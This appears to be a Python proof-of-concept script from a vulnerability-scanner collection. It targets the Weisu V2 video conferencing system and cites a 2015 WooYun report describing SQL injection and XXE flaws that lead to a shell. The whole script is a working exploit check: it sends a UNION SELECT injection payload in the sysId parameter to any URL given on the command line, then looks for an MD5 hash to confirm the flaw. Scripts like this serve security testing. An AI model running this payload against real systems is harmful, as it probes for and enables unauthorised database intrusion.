#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: V2视频会议系统某处SQL注射、XXE漏洞(可getshell)
referer: http://www.wooyun.org/bugs/wooyun-2015-0143276
author: Lucifer
description: 威速V2视频会议系统存在Union注入和XXE漏洞,可GETSHELL。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['V2视频会议系统某处SQL注射、XXE漏洞(可getshell)','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }

        vulnurl = url + r"/Conf/jsp/systembulletin/bulletinAction.do?operator=details&sysId=-1%20UnIoN%20SeLeCt%201,Md5(1234),3,Md5(1234),5%23"
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    